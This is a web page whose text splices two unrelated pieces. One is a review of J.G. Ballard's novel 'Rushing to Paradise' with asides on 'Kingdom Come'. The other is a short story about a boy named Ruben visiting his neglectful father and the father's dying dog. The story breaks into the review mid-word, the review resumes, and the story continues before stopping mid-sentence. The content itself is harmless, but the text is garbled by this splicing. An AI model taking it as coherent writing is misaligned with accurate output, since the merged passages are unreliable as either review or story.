Dead</em>.&#xa0; In other words, just as you&#x2019;ve managed to take one trope on board, another one bustles along to confuse you further.</p>   <p>&#xa0;</p>   <p>Sometimes I feel that this was due not so much to a decline in Ballard&#x2019;s writing powers, as to the fact that the modern world &#x2013; which all Ballard&#x2019;s work portrayed through a uniquely distorted prism, part Franz Kafka and part Salvador Dali &#x2013; was by the 21<sup>st</sup> century changing so fast.&#xa0; Even his satirical radar couldn&#x2019;t keep up with all the weird social, political and technological developments that contemporary life was generating.&#xa0; Neither could he quite manage to accommodate everything adequately in each new book.</p>   <p>&#xa0;</p>   <p>(Having said that, I should thank <em>Kingdom</em> <em>Come</em> for a memorable <em>frisson</em> it gave me last year, while I was reading it.&#xa0; I&#x2019;d arranged to&#xa0;meet a friend one afternoon in Carthage, the swankiest of Tunis&#x2019;s suburbs.&#xa0; My friend hadn&#x2019;t yet turned up when I got off at the local TCM station, which was&#xa0;next door to the Carthage Branch of Monoprix, so I took <em>Kingdom Come</em> out of my bag and spent a few minutes waiting beside the big supermarket with my nose stuck in its pages.&#xa0; It took me a minute or two to realise that&#xa0;the supermarket wasn&#x2019;t just closed for&#xa0;the afternoon.&#xa0; It was gutted.&#xa0; During the Tunisian revolution in January, it&#x2019;d been looted and trashed and stood now as a razed shell, a disturbingly incongruous spectacle in the middle of this smart neighbourhood of high white walls and thick iron gates, four-by-fours and swimming pools, orange trees and jasmine bushes.&#xa0; This&#xa0;was all spookily&#xa0;similar to what was happening in&#xa0;the book I was holding &#x2013; wow, the prophetic power of literature!&#xa0; If Ballard&#x2019;s ghost had been nearby, having a quiet chuckle, I wouldn&#x2019;t have been surprised.)</p>   <p>&#xa0;</p>   <p>A plot summary of <em>Rushing</em> <em>to</em> <em>Paradise</em> suggests a similar lack of focus.&#xa0; It tells the story of a group of environmental activists, led by an intense and plainly unbalanced woman called Dr Barbara Rafferty, who head for Saint Esprit, a Pacific atoll, to protest against a French nuclear test and save the albatrosses that nest there.&#xa0; By dumb luck rather than by any tactical ability, they manage to force the French to withdraw from the atoll and, with the place to themselves, Barbara hits on the idea of converting it into a global eco-sanctuary, one where endangered plants and animals can brought from other continents and allowed to grow or breed in safety.&#xa0; &#x201c;Think of Saint Esprit as the ultimate environmental project,&#x201d; she tells the youngest member of the group, a na&#xef;ve 16-year-old called Neil Dempsey who is the novel&#x2019;s focal character and whose loyalty to Barbara strays further into psychosis as the story progresses.&#xa0; &#x201c;We&#x2019;re engineering the ecology of paradise!&#x201d;&#xa0; Needless to say, things don&#x2019;t go as planned and the utopian society that the environmentalists set up on Saint Esprit falls more than slightly short of its goals.&#xa0; In fact, it all goes <em>Lord of the Flies</em>. &#xa0;(That happened a lot in Ballard&#x2019;s fiction.)</p>   <p>&#xa0;</p>   <p>Later, however, Ballard shifts gears and what had been a dark satire of environmental idealism becomes an even darker satire of feminism.&#xa0; Barbara starts to muse that, &#x201c;Women don&#x2019;t dislike men&#x2026; We bring them into this world and spend the rest of our lives helping them to understand themselves.&#xa0; If anything, we&#x2019;ve been too kind to them, letting them play their dangerous games.&#x201d;&#xa0; Meanwhile, the male members of the party start dying of strange, debilitating sicknesses.&#xa0; And whenever boatloads of environmental sympathisers arrive at the atoll, the women on board are persuaded to stay while the men go mysteriously missing.&#xa0; It eventually dawns on Neil that Barbara is keeping him alive so that he can impregnate the women around him and the atoll can propagate what she has identified now as the most valuable species of all &#x2013; the human female.&#xa0; And if anything happens to compromise Neil&#x2019;s fitness and virility, he&#x2019;ll go the same way as the other men.</p>   <p>&#xa0;</p>   <p>But the sudden switch&#xa0;from environmental satire to feminist satire here isn&#x2019;t as jarring as the competing elements in <em>Kingdom</em> <em>Come</em> or Ballard&#x2019;s other later books.&#xa0; Perhaps it&#x2019;s because we&#x2019;re set up for this transition early on in <em>Rushing to Paradise</em>.&#xa0; After meeting Barbara for the first time, a curious Neil does some research on her.&#xa0; He discovers that in her youth she was a proper <em>medical</em> doctor but was disgraced in a scandal where she assisted some terminally ill patients with their (alleged) wish to die.&#xa0; Thus, Ballard establishes her as a chameleon of trendy causes &#x2013; voluntary euthanasia, environmentalism, feminism &#x2013; who happily drops one and adopts another whenever it suits her damaged state of mind.</p>   <p>&#xa0;</p>   <p>In fact, I found <em>Rushing to Paradise</em> a surprisingly enjoyable book, more enjoyable than the assumptions I mentioned&#xa0;at the start of this review had led me to believe.&#xa0; Nonetheless, the strongest part of it is the bleakly-amusing central section, which details the environmentalists&#x2019; hopeless attempts to build a Gaia-friendly Shangri-La on the atoll after the French have abandoned it.&#xa0;

Splashes of sunshine fell through the window onto Ruben&#x2019;s face. He&#x2019;d only visited Dad once before. Dad had given him a big man&#x2019;s watch which dropped off Ruben&#x2019;s wrist. &#x201c;Don&#x2019;t you feed him?&#x201d; Dad had growled at Mum. She&#x2019;d rolled her eyes and said under her breath, <em>&#x201c;Idiot</em>.<em>&#x201c;</em></p>   <p>The motorway ended and the bus drove through dry farmland. Bleached tree-stumps huddled in groups like dinosaur bones. Soon, farms gave way to a row of shops with garage roller doors. Takeaways. A superette. A line of sad-looking houses with scraggly lawns and rusty swing-sets. Ruben recognized the pub with a rooster painted on it.</p>   <p>Braking with a screech, the bus paused in a layby. Ruben bounded down the steps, sprinting to Dad&#x2019;s little grey hatchback parked up on the verge. It was empty.</p>   <p>A motorbike tore past, shrinking into a soft dot.</p>   <p>Where was Dad? Ruben&#x2019;s ninth birthday had been and gone and Dad hadn&#x2019;t turned up for it. Hadn&#x2019;t even rung. For his eighth, he&#x2019;d arrived with a pocket knife that fell to bits as soon as Ruben opened it. &#x201c;Two-dollar shop rubbish,&#x201d; Mum said afterwards. &#x201c;It&#x2019;s <em>not</em> rubbish!&#x201d; Ruben flashed back, running to the end of the driveway, his heart about to explode.</p>   <p>Heat quivered off the baking tarseal. Cicadas droned scritch-scritch-scritch. Across the road, cows sat in the shade of a twisted tree. The cows could have been carved out of rock, not even a tail twitched.</p>   <p>Ruben&#x2019;s damp hair clung to his forehead. He pushed it out of his eyes. Brown hair, same as Mum&#x2019;s. He got his height from Dad. He was the tallest kid in class, people mistook him for being eleven or twelve. There was power in being tall. He hadn&#x2019;t worked it out exactly, yet when he&#x2019;d scowled down at Sam &#x2013; who&#x2019;d said Ruben&#x2019;s Dad was a dumb arse and his Mum was a ho &#x2013; Sam backed off without another mean word.</p>   <p>A cattle truck loomed and clattered by spitting gravel.</p>   <p>Ruben spotted someone in the distance, he couldn&#x2019;t tell if it was a man or a woman, he held his breath&#x2026;<em>please</em> be Dad. It was Dad, his hair fiery in the sun. Dad walked closer, kicking up gingery dust from the side of the road.</p>   <p>&#x201c;Hey, stranger.&#x201d;</p>   <p>&#x201c;Where were you?&#x201d; Ruben blurted.</p>   <p>&#x201c;Up at the shops,&#x201d; Dad threw a chocolate bar to Ruben.</p>   <p>&#x201c;I&#x2019;ve been waiting ages.&#x201d;</p>   <p>&#x201c;Hop in,&#x201d; Dad half-crouched to fit in the little car.</p>   <p>A cricket in a matchbox, Ruben thought.</p>   <p>It took Dad five goes to get the engine started. The car bumped over a pothole, all the windows rattling in their frames. They drove past more cows and crossed over a stream, swinging onto a narrow road. Dad parked in the driveway of the blue house made of knobbly concrete.</p>   <p>They walked up the gravel path. Dad was even skinnier than before and bent over as if he were old. If he ever came to school, the kids would think he was Ruben&#x2019;s <em>Granddad</em>.</p>   <p>The backyard was a jumble of wood-piles, bricks and overgrown weeds. A creek, running along the end of the section, was shaded by droopy trees.</p>   <p>&#x201c;Sad time for Homer,&#x201d; Dad sighed. The black labrador lay on a blanket by the wash-house. A tarpaulin was stretched out above him, and a sofa with stuffing oozing from its armrests. Squashed beer cans glinted in the long grass.</p>   <p>Homer rolled his eyes up to Dad and groaned.</p>   <p>&#x201c;What&#x2019;s wrong with him?&#x201d; Ruben asked.</p>   <p>&#x201c;Old. No cure for it, least none I know of.&#x201d;</p>   <p>Ruben had never seen a sick animal before. When his guinea pig died, it simply fell asleep one night.</p>   <p>Dad went into the wash-house, coming out with a car door and propping it against the sofa so that Homer had more shade.</p>   <p>&#x201c;You can pat him, if you want.&#x201d;</p>   <p>Ruben&#x2019;s hands felt cold and tingly, he stuffed them in his pockets. He started humming.</p>   <p>&#x201c;What&#x2019;s that song?&#x201d;</p>   <p>&#x201c;Mum sings it when I&#x2019;m sick.&#x201d;</p>   <p>Dad&#x2019;s eyes softened. His face stayed hard, though.</p>   <p>A pair of hawks sailed overhead, their wings tipped upwards.</p>   <p>&#x201c;Looking for road kill,&#x201d; Dad followed Ruben&#x2019;s gaze. &#x201c;Rabbits, hedgehogs, dumb possums. If you find anything dead on the road, kick it to the side so a hawk doesn&#x2019;t end up road kill, too.&#x201d;</p>   <p>Ruben nodded.</p>   <p>&#x201c;Put your bag in the front room.&#x201d;</p>   <p>Ruben pushed past the fig tree, it had grown up through the washing line and was covered in fruit. Nibbled figs showed bright pink insides. The tree needed a net over it. Mum had hung a net over the peach tree at home so birds wouldn&#x2019;t eat the fruit.</p>   <p>He smelt the loo. It was in the lean-to bathroom. You pulled a long chain to flush it, water shot into the bowl and the loo hee-hawed loud as a donkey. He&#x2019;d nearly jumped out of his skin when him and Mum had visited.</p>   <p>Ruben went inside the house. The first room on the left was the kitchen, then the lounge. Two bedrooms were on the right, the smallest one was at the end of the hall where a broken computer and two tellies were stacked against the front door.</p>   <p>The bedroom wasn&#x2019;t much bigger than a cupboard. It had old flowery wallpaper curling around the edges and only enough space for the camp bed and a dressing table with its mirror missing.</p>   <p>&#x2013;</p>   <p>Dad sat across from Ruben at the kitchen table, drinking beer. Shrubs had grown across the window giving the room a green underwater feel.</p>   <p>A fly landed on the table, sidling up to the tomato sauce bottle. Dad shooed it off.</p>   <p>The chops were tough. The mash had grey lumps in it.</p>   <p>&#x201c;How&#x2019;s your tea?&#x201d; Dad asked.</p>   <p>&#x201c;Yum as.&#x201d;</p>   <p>&#x201c;I&#x2019;ll cut it,&#x201d; Dad leant forward, slicing Ruben&#x2019;s chop into pea-sized pieces. &#x201c;What&#x2019;d you do in the holidays?&#x201d; he asked.</p>   <p>&#x201c;Not much&#x2026;got a Nintendo for Christmas. My friend Sam got a Wii. Mum said I might get one now she&#x2019;s working &#x2019;til five. I go to after-school with Sam. There&#x2019;s a swimming pool, the intermediate kids won&#x2019;t Iet us in the deep end.&#x201d;</p>   <p>Dad crushed his beer can and burped. &#x201c;What&#x2019;s your favourite subject?&#x201d;</p>   <p>&#x201c;Art. I won a drawing competition.&#x201d;</p>   <p>&#x201c;True?&#x201d;</p>   <p>&#x201c;Yep. Mum bought me pizza at a restaurant.&#x201d;</p>   <p>&#x201c;Great,&#x201d; Dad answered in a flat voice.</p>   <p>&#x201c;I won a thirty dollar book voucher,&#x201d; Ruben added, but something had gone wrong.</p>   <p>&#x201c;Better check on Homer,&#x201d; Dad pushed back his chair.</p>   <p>Ruben spat out the mouthful he&#x2019;d been politely chewing. The room was stifling. He tried to open the window but the shrubs were tightly pressed against it. Through a gap in the leaves he saw Dad sihensive Test Ban Treaty in 1996, those beastly French were definitely the environmental villains <em>du jour</em> when Ballard penned this novel.)&#xa0; He has a merry time skewering his characters for the gulf between their rhetoric and (the&#xa0;consequences of) their actions.&#xa0; For instance, the ship that carries them to the atoll causes an oil slick that destroys most of its birdlife.&#xa0; And the endangered animals that environmental groups around the world send to them, believing they&#x2019;ve turned the atoll into an ecological Noah&#x2019;s Ark, end up in their cooking pots as survival there becomes more desperate.</p>   <p>&#xa0;</p>   <p>Although his early novels like <em>The Drowned World</em> and <em>The Drought</em> dealt ostensibly with environmental disasters and were prescient of our modern fears about global warming, Ballard never seemed to have much truck with the environmental movement.&#xa0; Indeed, one or two of the pieces in his 1996 collection of non-fiction, <em>A User&#x2019;s Guide to the Millennium</em>, were published originally in motoring magazines and suggested he was even a bit of a petrol-head.&#xa0; However, I wouldn&#x2019;t go so far as the Spectator columnist Rod Liddle who, on the event of Ballard&#x2019;s death, declared that the writer had been a Conservative ().&#xa0; I know he did write once about &#x201c;the mysterious beauty of Margaret Thatcher&#x2026; the arch of her nostrils and the sheen on her lower lip&#x2026;&#x201d; but as this came from the pen of a man who&#x2019;d written in <em>Crash</em> about people being sexually aroused by car accidents, Mrs Thatcher would be ill-advised to take it as a compliment.&#xa0; Besides, in the 1990s, Ballard turned down the offer of a CBE, condemning the British honours system as &#x201c;a Ruritanian charade that helps prop up our top-heavy monarchy.&#x201d; &#xa0;Hardly the words of a man of the right.</p>   <p>&#xa0;</p>   <p>My feeling is that, rather than expressing Ballard&#x2019;s disdain for the environmental movement or for the feminist movement, <em>Rushing to Paradise</em> is merely a character study.&#xa0; It examines a megalomaniac who, as I&#x2019;ve said, uses causes such as environmentalism and feminism as tools to herd her followers closer and closer to her messianic goals.&#xa0; Indeed, Barbara is one of the most intriguing of Ballard&#x2019;s characters, managing to be a tyrant and mass-murderer but&#xa0;managing to engage the reader&#x2019;s pity too.&#xa0; In one of Neil&#x2019;s rare moments of insight, he glimpses the profound solitude that she really longs for, realising &#x201c;for the first time that she would only be happy when was alone on Saint Esprit, when Kino, Monique and the Saitos had gone and even the albatross had abandoned her.&#x201d;&#xa0; And her demented spirit seems to shine ever more brightly as people die around her and as her own body withers with malnutrition, illness and overwork.</p>   <p>&#xa0;</p>   <p>Correspondingly, if <em>Rushing to Paradise</em> has a fault, it lies in the characterisation of Neil.&#xa0; Possessing little spirit himself, easily manipulated and more than a little stupid, he seems to exist only as a literary device &#x2014; as&#xa0;a blank page for recording, and an empty mirror for reflecting, Barbara&#x2019;s glorious insanity. &#xa0;And unsurprisingly, at the book&#x2019;s finale, when he is rescued from the atoll, his one impulse is directed towards the mad but magnetic older woman who has dominated him for so long. &#xa0;Neil, writes Ballard, &#x201c;would join her, happy to be embraced again by Dr Barbara&#x2019;s cruel and generous heart.&#x201d;</p>   <p>&#xa0;</p>   <p>Indeed, his passivity becomes downright annoying. &#xa0;Reading the book, there were times when&#xa0;I wished that I could step into its pages,&#xa0;onto the sands of Saint Esprit, and throttle him &#x2014; or that Dr Barbara Rafferty would bump him off too and finish the job of rendering Saint Esprit&#x2019;s male population extinct.</p>   <p>&#xa0;</p>  </div>  
tting on the sofa. As if drawn by a string, Ruben went out to join him.</p>   <p>Dad bent down holding a sipper bottle to Homer&#x2019;s mouth. Homer slurped water and whimpered.</p>   <p>&#x201c;Poor thing,&#x201d; Ruben said, trying not to cry. &#x201c;I wish we could help him.&#x201d;</p>   <p>&#x201c;Have to keep the old fulla company.&#x201d;</p>   <p>It was so quiet &#x2013; even the birds had stopped calling. Ruben felt self-conscious, he wanted to speak but couldn&#x2019;t think of anything to say.</p>   <p>Eventually, footsteps sounded on the gravel path. Ruben turned around. A teenager strolled towards them carrying a box of beer.</p>   <p>&#x201c;Hey, Brodie,&#x201d; Dad said. &#x201c;This is Ruben. Ruben, Brodie&#x2019;s from next door.&#x201d;</p>   <p>Brodie cocked his head to one side, &#x201c;How do you know Big Red?&#x201d;</p>   <p>&#x201c;He&#x2019;s my Dad.&#x201d;</p>   <p>&#x201c;Huh.&#x201d;</p>   <p>Homer&#x2019;s tail shook weakly.</p>   <p>&#x201c;Pleased to see me, boy?&#x201d; Brodie squatted down, stroking him. &#x201c;Good boy, good boy.&#x201d;</p>   <p>&#x201c;Breaks my heart,&#x201d; Dad said.</p>   <p>&#x201c;Better sort it out soon,&#x201d; Brodie lit a rollie.</p>   <p>Ruben stared, amazed, as Brodie put his mouth close to Homer&#x2019;s nose and breathed out. The rollie smelt funny &#x2013; reminding him of the rotting hay Mum bought for their worm farm.</p>   <p>Three more puffs and Homer lay still.</p>   <p>&#x201c;Is he all right?&#x201d; Ruben whispered.</p>   <p>&#x201c;Course, calmed him down. Sad old mutt.&#x201d; Brodie pulled off his beanie and a bushy ball of black hair sprang out. &#x201c;You gotta get rid of your rubbish, Red. It&#x2019;s bringing rats.&#x201d;</p>   <p>Dad shrugged.</p>   <p>&#x201c;You said you&#x2019;d do it last week. My olds are totally pissed off.&#x201d;</p>   <p>&#x201c;Okay, okay. Tomorrow.&#x201d;</p>   <p>Brodie opened his box of beers, handing one to Dad. &#x201c;Hey, little buddy,&#x201d; he said, &#x201c;how do you put up with this guy?&#x201d;</p>   <p>Ruben liked Brodie&#x2019;s big smile and friendly eyes. &#x201c;Easy,&#x201d; he said proudly.</p>   <p>&#x201c;How come I haven&#x2019;t seen you before?&#x201d;</p>   <p>&#x201c;I live in town.&#x201d;</p>   <p>&#x201c;You should come down more often &#x2013; might make Red less grumpy.&#x201d;</p>   <p>&#x201c;Just had tea,&#x201d; Dad said. &#x201c;There&#x2019;s leftovers if you want.&#x201d;</p>   <p>Brodie shook his head.</p>   <p>&#x201c;What can we offer him?&#x201d; Dad asked Ruben.</p>   <p>A warm feeling sparked in Ruben. &#x201c;Coco Pops?&#x201d; he suggested.</p>   <p>&#x201c;Don&#x2019;t worry about it, already had a feed,&#x201d; Brodie sculled his beer.</p>   <p>&#x201c;Can I have Coco Pops for pudding?&#x201d;</p>   <p>&#x201c;Knock yourself out,&#x201d; Dad said.</p>   <p>As Ruben scooted off, he heard Brodie say, &#x201c;Since when did you have a kid?&#x201d;</p>   <p>&#x201c;Didn&#x2019;t see that coming, did you?&#x201d; Dad laughed.</p>   <p>However, all Ruben could think of was Dad saying, &#x201c;What else can <em>we</em> offer him?&#x201d; The warm feeling grew bigger. He had the idea that the world, though immense, was light as a feather and could change utterly &#x2013; wonderfully &#x2013; in a split second. He filled a bowl with Coco Pops, sitting on the back step to eat them. A fingernail moon shone, millions of stars &#x2013; like Guy Fawkes, without all the crack-crackle-booms.</p>   <p>Up ahead, Brodie lit a cigarette. Smoke gathered around his bushy hair turning it into an enormous ghostly dandelion.</p>   <p>&#x201c;You on for tonight, Red?&#x201d;</p>   <p>&#x201c;Better not, got the kid.&#x201d;</p>   <p>&#x201c;He&#x2019;ll be all right.&#x201d;</p>   <p>A dark shape slid through the fig tree. Ruben glimpsed a rat nibbling a fig. The rat melted back into a dark shape, slipping away.</p>   <p>&#x2013;</p>   <p>Ruben woke to the sound of loud music and wolf whistles. The party noise was coming from next door.</p>   <p>&#x201c;Dad?&#x201d; he called out. &#x201c;Dad?&#x201d;</p>   <p>The light was on in Dad&#x2019;s room. Dad wasn&#x2019;t there, not in the lounge or the kitchen, either.</p>   <p>Even though he was scared of the rat, Ruben creaked open the back door and tiptoed to where the hedge thinned. He could see Brodie&#x2019;s carport where people were standing around under a yellow light, drinking. An old nana came out of the house wearing purple trackpants and a long cardi.</p>   <p>&#x201c;Give us a song, Venus,&#x201d; came Dad&#x2019;s voice.</p>   <p>Crack! went Ruben&#x2019;s heart. He missed Mum so badly he thought he might puke. She&#x2019;d never left him alone at night, she watched telly on her own, he&#x2019;d fall asleep hearing it through the wall.</p>   <p>&#x201c;Come on,&#x201d; Brodie piped up.</p>   <p>&#x201c;Nah, I&#x2019;m not pissed enough,&#x201d; the old nana said.</p>   <p>&#x201c;Bloody hell, get on with it.&#x201d;</p>   <p>&#x201c;Shut your ugly face!&#x201d;</p>   <p>Ruben hurried back into the house, slamming the door behind him.</p>   <p>&#x2013;</p>   <p>Daylight seeped in beneath the curtain&#x2026;Ruben had dreamt of his blue-striped curtains back home. A rat had been scuffling around behind them, he&#x2019;d put his foot out to squash it and a ginger kitten squirmed out. The kitten was so small it had fitted in one hand.</p>   <p>A rooster crowed outside. Ruben got up and opened the curtain. The rooster was in Brodie&#x2019;s yard, standing on a wrecked car up on blocks.</p>   <p>Ruben put on a clean tee shirt and shorts and wandered out to Homer. The dog was so thin his ribcage stuck out. If only he could hold Homer in one hand and comfort him like he&#x2019;d comforted the dream kitten. He gently placed the palm of his hand on Homer&#x2019;s chest; Homer&#x2019;s heart shivered in its bony hutch.</p>   <p>The words to Mum&#x2019;s song came to him, he sang, <em>&#x201c;I got you, that&#x2019;s all I want. I won&#x2019;t forget, that&#x2019;s a whole lot&#x2026;You can see my eyes, you can tell that I&#x2019;m not ly-y-ing.</em>&#x201d;</p>   <p>Homer gave a scrappy yawn and fell asleep.</p>   <p>Hungry, Ruben went into the kitchen. The milk smelt funny so he only used a little on his Coco Pops.</p>   <p>Dad shuffled in, he had puffy eyes and a glittery day-old beard. &#x201c;Want a cuppa?&#x201d; he asked.</p>   <p>&#x201c;No, thanks.&#x201d;</p>   <p>&#x201c;Hope next door didn&#x2019;t wake you last night.&#x201d;</p>   <p>Ruben kept eating.</p>   <p>Dad scratched his beard. &#x201c;Have you seen the eels?&#x201d;</p>   <p>&#x2013;</p>   <p>Ruben followed Dad past flax, and a bush with leaves sharp as teeth. Jittery sparrows pecked about on top of a pile of bricks, scattering when they neared.</p>   <p>The creek twinkled where daylight shone through a gap in the trees. Dad pointed to a fern growing over the bank. &#x201c;Can you see it?&#x201d; he said. &#x201c;It&#x2019;s having a snooze.&#x201d;</p>   <p>A mud-coloured eel flicked its tail. Ruben leapt back as if bitten. The eel lazily stretched out, sliding away.</p>   <p>&#x201c;Want to catch it?&#x201d;</p>   <p>&#x201c;Yes, please!&#x201d;</p>   <p>&#x201c;There&#x2019;s a bucket in the wash-house, we&#x2019;ll need that.&#x201d;</p>   <p>A wild joy swept through Ruben as he raced to the wash-house.</p>   <p>&#x201c;Get the bread and a knife,&#x201d; Dad yelled. &#x201c;A sharp knife.&#x201d;</p>   <p>Ruben zigzagged past the flax and the pile of bricks. The wash-house was filled with junk. He stopped in the doorway, spotting a bucket on a rolled up carpet. He skip-ran past Homer, dashing to the house. Opening the fridge, he thrust the bag of bread into the bucket. The only knife on the bench was a small vegetable peeler. He checked in a drawer of kitchen things, finding a bigger knife and running out the door.</p>   <p>Dad had stripped off a length of flax and was making a noose. &#x201c;I&#x2019;ll fish them out,&#x201d; he said. &#x201c;You put them in the bucket quick as you can.&#x201d;</p>   <p>&#x201c;There it is!&#x201d; Ruben shouted.</p>   <p>&#x201c;Ssh&#x2026;ssh&#x2026;&#x201d;</p>   <p>The eel swam towards them with the wavy motion of a cat&#x2019;s tail.</p>   <p>Dad baited a stick with balled-up bread, slipping the noose and the stick into the water.</p>   <p>More eels approached, their side fins fluttering. One moved closer to the baited stick. Dad yanked the noose and the eel thrashed in the air before landing on the grass. Ruben screamed.</p>   <p>&#x201c;Get it!&#x201d; Dad said.</p>   <p>&#x201c;I can&#x2019;t. I can&#x2019;t.&#x201d;</p>   <p>The eel hooked backwards.</p>   <p>&#x201c;Quick.&#x201d;</p>   <p>Ruben made a grab for the eel, &#x201c;Ahh! It&#x2019;s slimy!&#x201d;</p>   <p>The eel curved towards the water. Dad reached across, whacking its head with a piece of wood.</p>   <p>&#x201c;You k-k-killed it,&#x201d; Ruben said in a squeaky voice.</p>   <p>Dad rebaited the stick. &#x201c;Quiet,&#x201d; he said, &#x201c;this is lunch.&#x201d;</p>   <p>&#x2013;</p>   <p>&#x201c;That&#x2019;s enough for me,&#x201d; Dad leant back in his chair.</p>   <p>&#x201c;It&#x2019;s weird that eels are fish,&#x201d; Ruben said.</p>   <p>&#x201c;Better than trout.&#x201d;</p>   <p>Ruben pushed together the last pieces of eel on his plate, he thought they were worse than eating slugs. &#x201c;I haven&#x2019;t had trout,&#x201d; he said.</p>   <p>&#x201c;Prefer eels.&#x201d;</p>   <p>&#x201c;Mmm&#x2026;it was fun catching them.&#x201d;</p>   <p>Outside, Homer let out a long moaning howl, giving Ruben goosebumps.</p>   <p>Dad opened his tobacco pouch and rolled a smoke, carefully nipping stray threads off each end.</p>   <p>Homer howled again.</p>   <p>Dad&#x2019;s eyes went dark and blank. &#x201c;How about you do the dishes?&#x201d; he said.</p>   <p>&#x201c;Sure, I help at home.&#x201d;</p>   <p>&#x201c;Think I&#x2019;ll go have a smoke.&#x201d;</p>   <p>Ruben scraped all the leftover eel onto one plate. Mum always covered food with gladwrap; he couldn&#x2019;t find any in the cupboards so he put the eel straight into the fridge.</p>   <p>&#x2013;</p>   <p>Dad lifted up one of the black rubbish sacks that were piled against the hedge. &#x201c;Give us a hand,&#x201d; he said to Ruben.</p>   <p>White butterflies trembled above the hedge, while untold flies zoomed around the sacks. The stink was terrible.</p>   <p>Giddy at the thought of rats, Ruben stayed put.</p>   <p>&#x201c;Come on, we need to get to the dump before it shuts.&#x201d;</p>   <p>Mouldy lumps dropped from a hole in the bottom of the sack as Dad carried it to the car .</p>   <p>Gingerly, Ruben hoisted up a sack.</p>   <p>&#x201c;Look out,&#x201d; Dad said. &#x201c;It&#x2019;s moving.&#x201d;</p>   <p>Ruben shrieked.</p>   <p>&#x201c;Just jokes,&#x201d; Dad laughed. &#x201c;I&#x2019;ll do it, you wait in the car.&#x201d;</p>   <p>Ruben sat in the front seat, pinching his nose and breathing through his mouth. Dad got in and they drove down to the main road.</p>   <p>&#x201c;How far away is the dump?&#x201d;</p>   <p>&#x201c;Bout ten minutes.&#x201d; Dad slowed down as a group of hooded boys wandered across the road. &#x201c;Stoners,&#x201d; he said.</p>   <p>They passed the superette and the takeaways, turning at the rooster pub. More sad-looking houses. A trampoline up on its side. A strange cactus in the shape of prickly dinner plates. They stopped outside an iron fence with loops of barbed wire strung along the top.</p>   <p>&#x201c;Might as well drop in on Mozzie,&#x201d; Dad said. &#x201c;He&#x2019;s got the most amazing car you&#x2019;ll ever see. Built it himself.&#x201d;</p>   <p>Dad opened the side gate for Ruben. They passed a white wooden house, a garden full of sprawling daisies, and a ute parked on the driveway. A fat dog came out of the garage. Ruben moved closer to Dad. The dog waddled over, &#xa0;sniffing Dad&#x2019;s feet &#x2013; the same sort of dog who, if it clamped down, would lock its jaws and never let go. Ruben had seen one on <em>Police Ten</em>.</p>   <p>It was a moment before Ruben&#x2019;s eyes adjusted to the hazy gloom in the garage. In the middle of greasy car parts was a shiny black car, its hood raised and a beam of light trained into the engine.</p>   <p>A bald man sat on a crate. He wore shorts as small as undies. He said, &#x201c;Yo, Red,&#x201d; puffed on a cigarette and blew smoke out his nose.</p>   <p>&#x201c;My boy, Ruben,&#x201d; Dad said. &#x201c;Ruben, Mozzie.&#x201d;</p>   <p>Mozzie had bulging eyes and tattoos on his neck. &#x201c;There&#x2019;s a surprise,&#x201d; he said without surprise, squashing his cigarette on the floor. &#x201c;This bloody heat, man. Can&#x2019;t think in it.&#x201d; He reached round, opening a fridge. Threw a beer at Dad. &#x201c;Maybe in couple year&#x2019;s time, eh Ruben? Off you go and play outside.&#x201d;</p>   <p>&#x201c;Only be a minute,&#x201d; Dad said.</p>   <p>Ruben emerged into the sunshine. From behind, came the dog, its claws sounding like marbles rolling along the floor.</p>   <p>&#x201c;She won&#x2019;t bite,&#x201d; Mozzie called out. &#x201c;She&#x2019;s full of pups.&#x201d;</p>   <p>The dog gazed at Ruben with faded eyes. She gulped air and lay on her side, staring at the backyard. Brown leaves dangled on a tree. Plums lay rotting on the ground with wasps zzz&#x2019;ing around them.</p>   <p>What creatures ate wasps? Ruben wondered. He&#x2019;d google it when he got home. He counted ants trickling along the concrete, growing drowsy after a hundred and three.</p>   <p>&#x2013;</p>   <p>&#x201c;Time to go,&#x201d; Dad woke Ruben.</p>   <p>Above Dad&#x2019;s head, the sky had filled with clouds. Mozzie&#x2019;s dog gruffed and resettled herself.</p>   <p>&#x201c;See you&#x2019;ve made a friend.&#x201d;</p>   <p>Ruben patted the dog&#x2019;s head and she nuzzled his hand. &#x201c;She&#x2019;s nice,&#x201d; he said.</p>   <p>&#x201c;This heat can&#x2019;t be much fun for her. She&#x2019;ll be happier when she offloads those pups.&#x201d;</p>   <p>Dad continued down the driveway, saying, &#x201c;It&#x2019;s too late for the bloody dump.&#x201d;</p>   <p>&#x201c;What about the rubbish?&#x201d;</p>   <p>&#x201c;Plan B,&#x201d; Dad opened the gate for Ruben.</p>   <p>They drove off, turning where a signpost said, <em>&#x201c;Lookout, 400m&#x201d;</em>.</p>   <p>&#x201c;What&#x2019;s at the Lookout?&#x201d;</p>   <p>&#x201c;The river.&#x201d;</p>   <p>The car bumped along a shingle road, ending in a carpark ringed by huge dark-green trees. Dad drew up next to a picnic table and a bin.</p>   <p>&#x201c;You can&#x2019;t fit all the rubbish in that bin,&#x201d; Ruben said.</p>   <p>&#x201c;Well, I can&#x2019;t take it home or Brodie&#x2019;s old man&#x2019;d kill me.&#x201d;</p>   <p>Dad hefted a sack out of the boot, stuffing it into the bin. Lifted up another sack, carrying it into the trees. A compost smell came up from the track as Ruben scuffed along after him. Pencils of light poked through gaps in the branches. The river could be heard gurgling. Birds sang kiddee-kiddee-kiddee.</p>   <p>Dad dropped the sack behind a bush. At home, Ruben and Mum had a recycling bin for bottles and cans, a compost bin for grass clippings, a worm farm for peelings and paper, and a wheelie bin for everything else.</p>   <p>Dad pushed past. &#x201c;Four to go,&#x201d; he said, his hair flashing as he cut through a pencil of light.</p>   <p>Ruben trudged back to the car. He picked up an empty chip bag, mashing it down inside the bin.</p>   <p><em>Kiddee-kiddee-kiddee</em>, birds flew fast overhead.</p>   <p>Ruben sat in the car, his stomach tied in a knot. It was wrong to dump rubbish.</p>   <p>Dad came back. &#x201c;All done. Home time,&#x201d; he revved the engine, tearing out of the carpark with dust rising behind them.</p>   <p>Ruben stared out the window; he had to make up for the rubbish.</p>   <p>When they got back to Dad&#x2019;s, they heard Homer whining before they&#x2019;d even opened the car doors.</p>   <p>&#x201c;Go inside and have a drink,&#x201d; Dad said, striding up the path.</p>   <p>Maybe a drawing would help? Yes, a drawing for Mum. Ruben got his sketchbook and pencils out of his bag, taking them into the kitchen. He sat at the table, thinking about what to draw&#x2026;and began sketching an eel with side fins the same shape as fans. He loved shading in the eel&#x2019;s curving tail and seed-black eyes. He&#x2019;d show Dad.</p>   <p>Outside, drizzle was falling. Steam rose from the warm ground. Homer was quiet. Maybe he was sleeping? Ruben padded down to the tarpaulin.</p>   <p>Dad knelt beside Homer, 